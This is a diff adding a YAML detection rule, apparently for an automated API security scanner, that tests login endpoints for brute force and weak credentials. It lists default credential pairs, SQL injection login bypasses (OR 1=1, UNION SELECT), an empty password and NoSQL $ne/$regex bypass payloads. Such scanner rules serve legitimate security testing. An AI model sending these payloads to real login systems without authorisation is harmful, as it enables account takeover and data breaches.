@@ -1,0 +1,81 @@
+# 暴力破解与弱密码检测规则
+# 针对登录/注册/密码重置端点的自动化测试
+name: brute_force
+description: Brute Force / Weak Credentials — 暴力破解与弱密码检测
+severity: high
+owasp: "API2:2023 — Broken Authentication"
+confidence: 0.75
+enabled: true
+
+endpoint_filter:
+  methods: [POST]
+  param_types: [body]
+  # 只对看起来像登录/认证的端点触发
+  param_name_patterns:
+    - ".*user.*"
+    - ".*login.*"
+    - ".*auth.*"
+    - ".*signin.*"
+    - ".*password.*"
+    - ".*email.*"
+    - ".*credential.*"
+
+payloads:
+  # 经典弱密码组合
+  - value: '{"username":"admin","password":"admin123"}'
+    description: "admin/admin123 经典组合"
+    content_type: application/json
+  - value: '{"username":"admin","password":"password"}'
+    description: "admin/password 默认密码"
+    content_type: application/json
+  - value: '{"username":"admin","password":"123456"}'
+    description: "admin/123456 弱密码"
+    content_type: application/json
+  - value: '{"username":"admin","password":"admin"}'
+    description: "账号密码相同"
+    content_type: application/json
+  - value: '{"username":"test","password":"test123"}'
+    description: "test/test123 测试账号"
+    content_type: application/json
+  - value: '{"username":"root","password":"root"}'
+    description: "root/root 默认组合"
+    content_type: application/json
+  - value: '{"username":"user","password":"user"}'
+    description: "user/user 普通账号"
+    content_type: application/json
+  # SQL 注入作为密码
+  - value: '{"username":"admin","password":"'' OR ''1''=''1"}'
+    description: "SQL 注入绕过登录 (OR 恒真)"
+    content_type: application/json
+  - value: '{"username":"admin","password":"'' OR 1=1--"}'
+    description: "SQL 注入变体 (OR 1=1--)"
+    content_type: application/json
+  - value: '{"username":"admin","password":"'' UNION SELECT 1,2,3--"}'
+    description: "SQL 注入 UNION 查询"
+    content_type: application/json
+  # 空密码
+  - value: '{"username":"admin","password":""}'
+    description: "空密码绕过"
+    content_type: application/json
+  # NoSQL 注入作为密码 (使用 JSON 裸对象)
+  - value: "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}"
+    description: "NoSQL 注入 $ne 绕过"
+    content_type: application/json
+  - value: "{\"username\":{\"$regex\":\"^admin\"},\"password\":{\"$ne\":\"\"}}"
+    description: "NoSQL 正则 + $ne 组合绕过"
+    content_type: application/json
+
+exploit_indicator:
+  patterns:
+    - "token"
+    - "access_token"
+    - "refresh_token"
+    - "login.*success"
+  status_codes: [200, 201]
+
+expected_normal: >
+  登录端点应实施速率限制；
+  拒绝常见弱密码；
+  使用多因素认证；
+  返回一致的错误信息不区分"用户不存在"和"密码错误"
+reasoning_template: "弱密码/暴力破解测试: {description}"
